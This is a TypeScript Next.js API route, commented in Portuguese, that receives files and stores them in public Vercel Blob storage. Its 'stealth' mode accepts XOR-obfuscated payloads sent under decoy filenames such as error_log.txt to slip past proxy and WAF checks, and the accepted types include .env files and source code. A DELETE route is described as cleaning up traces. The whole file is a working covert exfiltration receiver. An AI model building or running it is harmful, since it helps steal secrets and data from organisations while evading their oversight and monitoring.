import { put, del } from '@vercel/blob';
import { NextResponse } from 'next/server';

// Função auxiliar de Descriptografia XOR (Simétrica)
// Reverte o processo feito no Frontend para recuperar o Base64 original
const xorDecrypt = (base64Input: string, key: string = "audit-key") => {
  // 1. Decodifica o Base64 de transporte para string binária cifrada
  const text = Buffer.from(base64Input, 'base64').toString('binary');

  let result = "";
  for (let i = 0; i < text.length; i++) {
    // 2. Aplica XOR reverso (mesma operação)
    result += String.fromCharCode(text.charCodeAt(i) ^ key.charCodeAt(i % key.length));
  }
  return result; // Retorna a string Base64 original do arquivo (com headers data:...)
};

export async function POST(request: Request): Promise<NextResponse> {
  // 1. Segurança: Validação de Variáveis de Ambiente
  const SECRET = process.env.AUDIT_SECRET;

  if (!SECRET) {
    console.error('SERVER ERROR: AUDIT_SECRET não configurado.');
    return NextResponse.json({ error: 'Erro de configuração no servidor' }, { status: 500 });
  }

  // 2. Segurança: Validação do Token
  const token = request.headers.get('x-audit-token');

  if (token !== SECRET) {
    return NextResponse.json({ error: 'Acesso Negado' }, { status: 401 });
  }

  // 3. Captura de Parâmetros
  const { searchParams } = new URL(request.url);
  // Nota: No modo stealth, 'filename' pode ser falso (ex: error_log.txt)
  let filename = searchParams.get('filename');
  const mode = searchParams.get('mode');

  if (!filename) {
    return NextResponse.json({ error: 'Nome do arquivo necessário' }, { status: 400 });
  }

  // 4. Validação de Extensões (Lista Completa)
  const allowedExtensions = [
    // Documentos e Imagens
    '.txt', '.docx', '.doc', '.png', '.jpg', '.jpeg', '.gif', '.log', '.csv', '.xlsx', '.xls', '.pdf', '.json', '.zip', '.rar',
    // Códigos e Scripts
    '.py',   // Python
    '.js',   // JavaScript
    '.jsx',  // React JS
    '.ts',   // TypeScript
    '.tsx',  // React TS
    '.java', // Java
    '.c',    // C
    '.cpp',  // C++
    '.cs',   // C#
    '.go',   // Go
    '.rb',   // Ruby
    '.php',  // PHP
    '.sh',   // Shell Script
    '.bat',  // Batch
    '.sql',  // SQL
    '.html', '.css', '.xml', '.yaml', '.yml', '.md', '.env', '.ini' // Web & Config
  ];

  // Validação preliminar da URL (Proxy/WAF check)
  const isAllowedURL = allowedExtensions.some(ext => filename!.toLowerCase().endsWith(ext));

  if (!isAllowedURL) {
    return NextResponse.json({
      error: `Extensão bloqueada na URL. Permitidos: ${allowedExtensions.join(', ')}`
    }, { status: 403 });
  }

  // 5. Processamento do Corpo do Arquivo
  let fileBody;

  if (mode === 'stealth') {
    try {
      // MODO STEALTH v2 (Payload Camuflado + XOR)
      const jsonBody = await request.json();

      // Verifica se é o payload novo (mimicry) ou o antigo
      const encryptedPayload = jsonBody.payload || jsonBody.fileData;
      const realName = jsonBody.realName;

      if (!encryptedPayload) {
        throw new Error('Payload criptografado ausente');
      }

      // Se veio o nome real escondido no JSON, usamos ele para salvar o arquivo final
      if (realName) {
        filename = realName;
      }

      // 1. Descriptografa (XOR)
      const decryptedBase64 = xorDecrypt(encryptedPayload);

      // 2. Remove o cabeçalho do Data URL (ex: "data:application/pdf;base64,")
      // Isso é necessário porque o FileReader do JS inclui isso no começo
      const base64Clean = decryptedBase64.includes(',')
        ? decryptedBase64.split(',').pop()
        : decryptedBase64;

      // 3. Converte para Buffer binário para salvar
      fileBody = Buffer.from(base64Clean!, 'base64');

    } catch (e) {
      console.error('Erro no modo Stealth:', e);
      return NextResponse.json({ error: 'Falha ao processar payload cifrado' }, { status: 400 });
    }
  } else {
    // MODO NORMAL (Stream direto)
    if (!request.body) {
      return NextResponse.json({ error: 'Arquivo inválido ou corpo vazio' }, { status: 400 });
    }
    fileBody = request.body;
  }

  // 6. Upload para Vercel Blob
  try {
    // Salvamos com o filename (que no modo stealth, agora é o nome real recuperado)
    const blob = await put(filename!, fileBody, { access: 'public' });
    return NextResponse.json(blob);
  } catch (error) {
    console.error('Erro no Vercel Blob:', error);
    return NextResponse.json({ error: 'Erro interno no upload' }, { status: 500 });
  }
}

// Rota DELETE para limpeza de rastros
export async function DELETE(request: Request): Promise<NextResponse> {
  const SECRET = process.env.AUDIT_SECRET;
  const token = request.headers.get('x-audit-token');

  // Validação estrita
  if (!SECRET || token !== SECRET) {
    return NextResponse.json({ error: 'Acesso Negado' }, { status: 401 });
  }

  const { searchParams } = new URL(request.url);
  const urlToDelete = searchParams.get('url');

  if (!urlToDelete) {
    return NextResponse.json({ error: 'URL necessária para deleção' }, { status: 400 });
  }

  try {
    await del(urlToDelete);
    return NextResponse.json({ success: true });
  } catch (error) {
    return NextResponse.json({ error: 'Falha ao deletar arquivo' }, { status: 500 });
  }
}